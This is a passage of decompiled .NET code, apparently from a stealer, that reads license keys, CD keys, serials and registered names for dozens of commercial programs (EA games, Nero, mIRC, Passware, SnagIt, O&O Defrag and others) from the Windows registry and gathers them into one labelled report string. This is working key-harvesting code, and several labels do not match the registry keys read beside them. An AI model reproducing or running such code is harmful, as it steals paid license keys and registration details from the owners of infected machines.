					num = 400;
					text53 += "\r\nMacromedia Dreamweaver 7 :";
					goto IL_19e4;
					IL_19e4:
					num = 401;
					text155 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Macromedia\\Dreamweaver\\7\\Registration", "Serial Number", null));
					goto IL_1a01;
					IL_1a01:
					num = 402;
					text53 += text155;
					goto IL_1a10;
					IL_1a10:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1a17;
					IL_1a17:
					num = 404;
					text53 += "\r\nMadden NFL 07 :";
					goto IL_1a29;
					IL_1a29:
					num = 405;
					text156 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Madden NFL 07", "ergc", null));
					goto IL_1a46;
					IL_1a46:
					num = 406;
					text53 += text156;
					goto IL_1a55;
					IL_1a55:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1a5c;
					IL_1a5c:
					num = 408;
					text53 += "\r\nMatrix Screensave :";
					goto IL_1a6e;
					IL_1a6e:
					num = 409;
					text157 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\JSG\\Matrix Saver V2", "Registration", null));
					goto IL_1a8b;
					IL_1a8b:
					num = 410;
					text53 += text157;
					goto IL_1a9a;
					IL_1a9a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1aa1;
					IL_1aa1:
					num = 412;
					text53 += "\r\nMedal of Honor Airborne :";
					goto IL_1ab3;
					IL_1ab3:
					num = 413;
					text158 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Medal of Honor Airborne", "Product GUID", null));
					goto IL_1ad0;
					IL_1ad0:
					num = 414;
					text53 += text158;
					goto IL_1adf;
					IL_1adf:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1ae6;
					IL_1ae6:
					num = 416;
					text53 += "\r\nMedal of Honor: Airborne :";
					goto IL_1af8;
					IL_1af8:
					num = 417;
					text159 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault", "ergc", null));
					goto IL_1b15;
					IL_1b15:
					num = 418;
					text53 += text159;
					goto IL_1b24;
					IL_1b24:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1b2b;
					IL_1b2b:
					num = 420;
					text53 += "\r\nMedal of Honor: Allied Assault :";
					goto IL_1b3d;
					IL_1b3d:
					num = 421;
					text160 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough", "ergc", null));
					goto IL_1b5a;
					IL_1b5a:
					num = 422;
					text53 += text160;
					goto IL_1b69;
					IL_1b69:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1b70;
					IL_1b70:
					num = 424;
					text53 += "\r\nMedal of Honor: Allied Assault: Breakthrough :";
					goto IL_1b82;
					IL_1b82:
					num = 425;
					text161 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead", "ergc", null));
					goto IL_1b9f;
					IL_1b9f:
					num = 426;
					text53 += text161;
					goto IL_1bae;
					IL_1bae:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1bb5;
					IL_1bb5:
					num = 428;
					text53 += "\r\nMedal of Honor: Allied Assault: Spearhead :";
					goto IL_1bc7;
					IL_1bc7:
					num = 429;
					text162 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Medal of Honor: Heroes 2", "ergc", null));
					goto IL_1be4;
					IL_1be4:
					num = 430;
					text53 += text162;
					goto IL_1bf3;
					IL_1bf3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1bfa;
					IL_1bfa:
					num = 432;
					text53 += "\r\nMedal of Honor: Heroes 2 :";
					goto IL_1c0c;
					IL_1c0c:
					num = 433;
					text163 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "UserName", null));
					goto IL_1c29;
					IL_1c29:
					num = 434;
					text53 += text163;
					goto IL_1c38;
					IL_1c38:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1c3f;
					IL_1c3f:
					num = 436;
					text53 += "\r\nmIRC :";
					goto IL_1c51;
					IL_1c51:
					num = 437;
					text164 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\mIRC", "License", null));
					goto IL_1c6e;
					IL_1c6e:
					num = 438;
					text53 += text164;
					goto IL_1c7d;
					IL_1c7d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1c84;
					IL_1c84:
					num = 440;
					text53 += "\r\nNascar Racing 2002 :";
					goto IL_1c96;
					IL_1c96:
					num = 441;
					text165 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002", "ergc", null));
					goto IL_1cb3;
					IL_1cb3:
					num = 442;
					text53 += text165;
					goto IL_1cc2;
					IL_1cc2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1cc9;
					IL_1cc9:
					num = 444;
					text53 += "\r\nNascar Racing 2003 :";
					goto IL_1cdb;
					IL_1cdb:
					num = 445;
					text166 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003", "ergc", null));
					goto IL_1cf8;
					IL_1cf8:
					num = 446;
					text53 += text166;
					goto IL_1d07;
					IL_1d07:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1d0e;
					IL_1d0e:
					num = 448;
					text53 += "\r\nNHL 2002 :";
					goto IL_1d20;
					IL_1d20:
					num = 449;
					text167 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_1d3d;
					IL_1d3d:
					num = 450;
					text53 += text167;
					goto IL_1d4c;
					IL_1d4c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1d53;
					IL_1d53:
					num = 452;
					text53 += "\r\nNBA LIVE 2003 :";
					goto IL_1d65;
					IL_1d65:
					num = 453;
					text168 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2003", "ergc", null));
					goto IL_1d82;
					IL_1d82:
					num = 454;
					text53 += text168;
					goto IL_1d91;
					IL_1d91:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1d98;
					IL_1d98:
					num = 456;
					text53 += "\r\nNBA LIVE 2004 :";
					goto IL_1daa;
					IL_1daa:
					num = 457;
					text169 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 2004", "ergc", null));
					goto IL_1dc7;
					IL_1dc7:
					num = 458;
					text53 += text169;
					goto IL_1dd6;
					IL_1dd6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1ddd;
					IL_1ddd:
					num = 460;
					text53 += "\r\nNBA LIVE 07 :";
					goto IL_1def;
					IL_1def:
					num = 461;
					text170 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA LIVE 07", "ergc", null));
					goto IL_1e0c;
					IL_1e0c:
					num = 462;
					text53 += text170;
					goto IL_1e1b;
					IL_1e1b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1e22;
					IL_1e22:
					num = 464;
					text53 += "\r\nNBA Live 08 :";
					goto IL_1e34;
					IL_1e34:
					num = 465;
					text171 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NBA Live 08", "ergc", null));
					goto IL_1e51;
					IL_1e51:
					num = 466;
					text53 += text171;
					goto IL_1e60;
					IL_1e60:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1e67;
					IL_1e67:
					num = 468;
					text53 += "\r\nNero - Burning Rom :";
					goto IL_1e79;
					IL_1e79:
					num = 469;
					text172 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\Nero - Burning Rom\\Info", "Serial6", null));
					goto IL_1e96;
					IL_1e96:
					num = 470;
					text53 += text172;
					goto IL_1ea5;
					IL_1ea5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1eac;
					IL_1eac:
					num = 472;
					text53 += "\r\nNero 7 :";
					goto IL_1ebe;
					IL_1ebe:
					num = 473;
					text173 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Nero\\Installation\\Families\\Nero 7\\Info", "Serial7_1191197813", null));
					goto IL_1edb;
					IL_1edb:
					num = 474;
					text53 += text173;
					goto IL_1eea;
					IL_1eea:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1ef1;
					IL_1ef1:
					num = 476;
					text53 += "\r\nNero 8 :";
					goto IL_1f03;
					IL_1f03:
					num = 477;
					text174 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Nero\\Installation\\Families\\Nero 8\\Info", "Serial8_1194709660", null));
					goto IL_1f20;
					IL_1f20:
					num = 478;
					text53 += text174;
					goto IL_1f2f;
					IL_1f2f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1f36;
					IL_1f36:
					num = 480;
					text53 += "\r\nNHL 2002 :";
					goto IL_1f48;
					IL_1f48:
					num = 481;
					text175 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002", "ergc", null));
					goto IL_1f65;
					IL_1f65:
					num = 482;
					text53 += text175;
					goto IL_1f74;
					IL_1f74:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1f7b;
					IL_1f7b:
					num = 484;
					text53 += "\r\nNHL 2003 :";
					goto IL_1f8d;
					IL_1f8d:
					num = 485;
					text176 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003", "ergc", null));
					goto IL_1faa;
					IL_1faa:
					num = 486;
					text53 += text176;
					goto IL_1fb9;
					IL_1fb9:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_1fc0;
					IL_1fc0:
					num = 488;
					text53 += "\r\nNHL 2004 :";
					goto IL_1fd2;
					IL_1fd2:
					num = 489;
					text177 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2004", "ergc", null));
					goto IL_1fef;
					IL_1fef:
					num = 490;
					text53 += text177;
					goto IL_1ffe;
					IL_1ffe:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2005;
					IL_2005:
					num = 492;
					text53 += "\r\nNHL 2005 :";
					goto IL_2017;
					IL_2017:
					num = 493;
					text178 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2005", "ergc", null));
					goto IL_2034;
					IL_2034:
					num = 494;
					text53 += text178;
					goto IL_2043;
					IL_2043:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_204a;
					IL_204a:
					num = 496;
					text53 += "\r\nNOX :";
					goto IL_205c;
					IL_205c:
					num = 497;
					text179 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Westwood\\Nox", "Serial", null));
					goto IL_2079;
					IL_2079:
					num = 498;
					text53 += text179;
					goto IL_2088;
					IL_2088:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_208f;
					IL_208f:
					num = 500;
					text53 += "\r\nNumega SmartCheck :";
					goto IL_20a1;
					IL_20a1:
					num = 501;
					text180 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\NuMega\\SmartCheck", "Serial", null));
					goto IL_20be;
					IL_20be:
					num = 502;
					text53 += text180;
					goto IL_20cd;
					IL_20cd:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_20d4;
					IL_20d4:
					num = 504;
					text53 += "\r\nOnlineTVPlayer (Name) :";
					goto IL_20e6;
					IL_20e6:
					num = 505;
					text181 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "name", null));
					goto IL_2103;
					IL_2103:
					num = 506;
					text53 += text181;
					goto IL_2112;
					IL_2112:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2119;
					IL_2119:
					num = 508;
					text53 += "\r\nOnlineTVPlayer (Serial) :";
					goto IL_212b;
					IL_212b:
					num = 509;
					text182 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\OnlineTVPlayer\\RegInfo", "serial", null));
					goto IL_2148;
					IL_2148:
					num = 510;
					text53 += text182;
					goto IL_2157;
					IL_2157:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_215e;
					IL_215e:
					num = 512;
					text53 += "\r\nO&O Defrag 8.0 (Username) :";
					goto IL_2170;
					IL_2170:
					num = 513;
					text183 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "User", null));
					goto IL_218d;
					IL_218d:
					num = 514;
					text53 += text183;
					goto IL_219c;
					IL_219c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_21a3;
					IL_21a3:
					num = 516;
					text53 += "\r\nO&O Defrag 8.0 (Company) :";
					goto IL_21b5;
					IL_21b5:
					num = 517;
					text184 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "Company", null));
					goto IL_21d2;
					IL_21d2:
					num = 518;
					text53 += text184;
					goto IL_21e1;
					IL_21e1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_21e8;
					IL_21e8:
					num = 520;
					text53 += "\r\nO&O Defrag 8.0 (Serial) :";
					goto IL_21fa;
					IL_21fa:
					num = 521;
					text185 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\O&O\\O&O Defrag\\8.0\\Pro\\licenses", "SerialNo", null));
					goto IL_2217;
					IL_2217:
					num = 522;
					text53 += text185;
					goto IL_2226;
					IL_2226:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_222d;
					IL_222d:
					num = 524;
					text53 += "\r\nPartition Magic 8.0 :";
					goto IL_223f;
					IL_223f:
					num = 525;
					text186 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\PowerQuest\\PartitionMagic\\8.0\\UserInfo", "SerialNumber", null));
					goto IL_225c;
					IL_225c:
					num = 526;
					text53 += text186;
					goto IL_226b;
					IL_226b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2272;
					IL_2272:
					num = 528;
					text53 += "\r\nPassware Encryption Analyzer (Name) :";
					goto IL_2284;
					IL_2284:
					num = 529;
					text187 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Name", null));
					goto IL_22a1;
					IL_22a1:
					num = 530;
					text53 += text187;
					goto IL_22b0;
					IL_22b0:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_22b7;
					IL_22b7:
					num = 532;
					text53 += "\r\nPassware Encryption Analyzer (License) :";
					goto IL_22c9;
					IL_22c9:
					num = 533;
					text188 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "SerialNumber", null));
					goto IL_22e6;
					IL_22e6:
					num = 534;
					text53 += text188;
					goto IL_22f5;
					IL_22f5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_22fc;
					IL_22fc:
					num = 536;
					text53 += "\r\nPassware Encryption Analyzer (Serial) :";
					goto IL_230e;
					IL_230e:
					num = 537;
					text189 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Encryption Analyzer\\1\\Registration,License", "Serial", null));
					goto IL_232b;
					IL_232b:
					num = 538;
					text53 += text189;
					goto IL_233a;
					IL_233a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2341;
					IL_2341:
					num = 540;
					text53 += "\r\nPassware Windows Key (License) :";
					goto IL_2353;
					IL_2353:
					num = 541;
					text190 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "License", null));
					goto IL_2370;
					IL_2370:
					num = 542;
					text53 += text190;
					goto IL_237f;
					IL_237f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2386;
					IL_2386:
					num = 544;
					text53 += "\r\nPassware Windows Key (Name) :";
					goto IL_2398;
					IL_2398:
					num = 545;
					text191 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Name", null));
					goto IL_23b5;
					IL_23b5:
					num = 546;
					text53 += text191;
					goto IL_23c4;
					IL_23c4:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_23cb;
					IL_23cb:
					num = 548;
					text53 += "\r\nPassware Windows Key (Serial) :";
					goto IL_23dd;
					IL_23dd:
					num = 549;
					text192 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Passware\\Windows Key\\7\\Registration", "Serial", null));
					goto IL_23fa;
					IL_23fa:
					num = 550;
					text53 += text192;
					goto IL_2409;
					IL_2409:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2410;
					IL_2410:
					num = 552;
					text53 += "\r\nPowerDvD :";
					goto IL_2422;
					IL_2422:
					num = 553;
					text193 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\CyberLink\\PowerDVD", "UI_RMK", null));
					goto IL_243f;
					IL_243f:
					num = 554;
					text53 += text193;
					goto IL_244e;
					IL_244e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2455;
					IL_2455:
					num = 556;
					text53 += "\r\nPowerStrip :";
					goto IL_2467;
					IL_2467:
					num = 557;
					text194 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\EnTech\\PowerStrip", "Key", null));
					goto IL_2484;
					IL_2484:
					num = 558;
					text53 += text194;
					goto IL_2493;
					IL_2493:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_249a;
					IL_249a:
					num = 560;
					text53 += "\r\nPro Evolution Soccer 2008 :";
					goto IL_24ac;
					IL_24ac:
					num = 561;
					text195 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\KONAMI\\PES2008", "code", null));
					goto IL_24c9;
					IL_24c9:
					num = 562;
					text53 += text195;
					goto IL_24d8;
					IL_24d8:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_24df;
					IL_24df:
					num = 564;
					text53 += "\r\nRainbow Six III RavenShield :";
					goto IL_24f1;
					IL_24f1:
					num = 565;
					text196 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Red Storm Entertainment\\RAVENSHIELD", "CDKey", null));
					goto IL_250e;
					IL_250e:
					num = 566;
					text53 += text196;
					goto IL_251d;
					IL_251d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2524;
					IL_2524:
					num = 568;
					text53 += "\r\nShogun Total War Warlord Edition :";
					goto IL_2536;
					IL_2536:
					num = 569;
					text197 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition", "ergc", null));
					goto IL_2553;
					IL_2553:
					num = 570;
					text53 += text197;
					goto IL_2562;
					IL_2562:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2569;
					IL_2569:
					num = 572;
					text53 += "\r\nSid(Meier) 's Pirates! :";
					goto IL_257b;
					IL_257b:
					num = 573;
					text198 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Atari\\Sid Meier's Pirates!", "CDKey", null));
					goto IL_2598;
					IL_2598:
					num = 574;
					text53 += text198;
					goto IL_25a7;
					IL_25a7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_25ae;
					IL_25ae:
					num = 576;
					text53 += "\r\nSid(Meier) 's Pirates! :";
					goto IL_25c0;
					IL_25c0:
					num = 577;
					text199 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Ubisoft\\SILENT HUNTER III\\Keys", "DiscKey_SH3", null));
					goto IL_25dd;
					IL_25dd:
					num = 578;
					text53 += text199;
					goto IL_25ec;
					IL_25ec:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_25f3;
					IL_25f3:
					num = 580;
					text53 += "\r\nSim City 4 Deluxe :";
					goto IL_2605;
					IL_2605:
					num = 581;
					text200 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4 Deluxe", "ergc", null));
					goto IL_2622;
					IL_2622:
					num = 582;
					text53 += text200;
					goto IL_2631;
					IL_2631:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2638;
					IL_2638:
					num = 584;
					text53 += "\r\nSim City 4 :";
					goto IL_264a;
					IL_264a:
					num = 585;
					text201 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Maxis\\ Sim City 4", "ergc", null));
					goto IL_2667;
					IL_2667:
					num = 586;
					text53 += text201;
					goto IL_2676;
					IL_2676:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_267d;
					IL_267d:
					num = 588;
					text53 += "\r\nSniffer Pro 4.5 :";
					goto IL_268f;
					IL_268f:
					num = 589;
					text202 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Network Associates, Inc.\\Sniffer Pro\\4.5\\USER", "SerialNumber", null));
					goto IL_26ac;
					IL_26ac:
					num = 590;
					text53 += text202;
					goto IL_26bb;
					IL_26bb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_26c2;
					IL_26c2:
					num = 592;
					text53 += "\r\nSoldiers Of Anarchy :";
					goto IL_26d4;
					IL_26d4:
					num = 593;
					text203 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_26f1;
					IL_26f1:
					num = 594;
					text53 += text203;
					goto IL_2700;
					IL_2700:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2707;
					IL_2707:
					num = 596;
					text53 += "\r\nSoldiers Of Anarchy :";
					goto IL_2719;
					IL_2719:
					num = 597;
					text204 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Silver Style Entertainment\\Soldiers Of Anarchy", "Settings", null));
					goto IL_2736;
					IL_2736:
					num = 598;
					text53 += text204;
					goto IL_2745;
					IL_2745:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_274c;
					IL_274c:
					num = 600;
					text53 += "\r\nStalker - Shadow of Chernobyl :";
					goto IL_275e;
					IL_275e:
					num = 601;
					text205 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\GSC Game World\\STALKER-SHOC", "InstallCDKEY", null));
					goto IL_277b;
					IL_277b:
					num = 602;
					text53 += text205;
					goto IL_278a;
					IL_278a:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2791;
					IL_2791:
					num = 604;
					text53 += "\r\nStar Wars Battlefront II (v1.0) :";
					goto IL_27a3;
					IL_27a3:
					num = 605;
					text206 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.0", "CD Key", null));
					goto IL_27c0;
					IL_27c0:
					num = 606;
					text53 += text206;
					goto IL_27cf;
					IL_27cf:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_27d6;
					IL_27d6:
					num = 608;
					text53 += "\r\nStar Wars Battlefront II (v1.1) :";
					goto IL_27e8;
					IL_27e8:
					num = 609;
					text207 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\LucasArts\\Star Wars Battlefront II\\1.1", "CD Key", null));
					goto IL_2805;
					IL_2805:
					num = 610;
					text53 += text207;
					goto IL_2814;
					IL_2814:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_281b;
					IL_281b:
					num = 612;
					text53 += "\r\nSteganos Internet Anonym VPN :";
					goto IL_282d;
					IL_282d:
					num = 613;
					text208 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_284a;
					IL_284a:
					num = 614;
					text53 += text208;
					goto IL_2859;
					IL_2859:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2860;
					IL_2860:
					num = 616;
					text53 += "\r\nSplinter Cell Pandora Tomorrow :";
					goto IL_2872;
					IL_2872:
					num = 617;
					text209 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Steganos\\SIAVPN", "ClientID", null));
					goto IL_288f;
					IL_288f:
					num = 618;
					text53 += text209;
					goto IL_289e;
					IL_289e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_28a5;
					IL_28a5:
					num = 620;
					text53 += "\r\nSurpreme Commander :";
					goto IL_28b7;
					IL_28b7:
					num = 621;
					text210 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\THQ\\Gas Powered Games\\Supreme Commander", "KEY", null));
					goto IL_28d4;
					IL_28d4:
					num = 622;
					text53 += text210;
					goto IL_28e3;
					IL_28e3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_28ea;
					IL_28ea:
					num = 624;
					text53 += "\r\nS.W.A.T 2 :";
					goto IL_28fc;
					IL_28fc:
					num = 625;
					text211 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat2", null));
					goto IL_2919;
					IL_2919:
					num = 626;
					text53 += text211;
					goto IL_2928;
					IL_2928:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_292f;
					IL_292f:
					num = 628;
					text53 += "\r\nS.W.A.T 3 :";
					goto IL_2941;
					IL_2941:
					num = 629;
					text212 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat3", null));
					goto IL_295e;
					IL_295e:
					num = 630;
					text53 += text212;
					goto IL_296d;
					IL_296d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2974;
					IL_2974:
					num = 632;
					text53 += "\r\nS.W.A.T 4 :";
					goto IL_2986;
					IL_2986:
					num = 633;
					text213 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Sierra\\CDKey", "swat4", null));
					goto IL_29a3;
					IL_29a3:
					num = 634;
					text53 += text213;
					goto IL_29b2;
					IL_29b2:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_29b9;
					IL_29b9:
					num = 636;
					text53 += "\r\nTechSmith SnagIt (Name) :";
					goto IL_29cb;
					IL_29cb:
					num = 637;
					text214 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegisteredTo", null));
					goto IL_29e8;
					IL_29e8:
					num = 638;
					text53 += text214;
					goto IL_29f7;
					IL_29f7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_29fe;
					IL_29fe:
					num = 640;
					text53 += "\r\nTechSmith SnagIt (Name) :";
					goto IL_2a10;
					IL_2a10:
					num = 641;
					text215 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_2a2d;
					IL_2a2d:
					num = 642;
					text53 += text215;
					goto IL_2a3c;
					IL_2a3c:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2a43;
					IL_2a43:
					num = 644;
					text53 += "\r\nTechSmith SnagIt (Serial) :";
					goto IL_2a55;
					IL_2a55:
					num = 645;
					text216 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TechSmith\\SnagIt\\8", "RegistrationKey", null));
					goto IL_2a72;
					IL_2a72:
					num = 646;
					text53 += text216;
					goto IL_2a81;
					IL_2a81:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2a88;
					IL_2a88:
					num = 648;
					text53 += "\r\nTexas Calculatem 4 (Owner) :";
					goto IL_2a9a;
					IL_2a9a:
					num = 649;
					text217 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Owner Name", null));
					goto IL_2ab7;
					IL_2ab7:
					num = 650;
					text53 += text217;
					goto IL_2ac6;
					IL_2ac6:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_2acd;
					IL_2acd:
					num = 652;
					text53 += "\r\nTexas Calculatem 4 (Owner) :";
					goto IL_2adf;
					IL_2adf:
					num = 653;
					text218 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\TexasCalc\\License", "Registration Key", null));
					goto IL_2afc;
					IL_2afc:
					num = 654;
					text53 += text218;
					goto IL_2b0b;
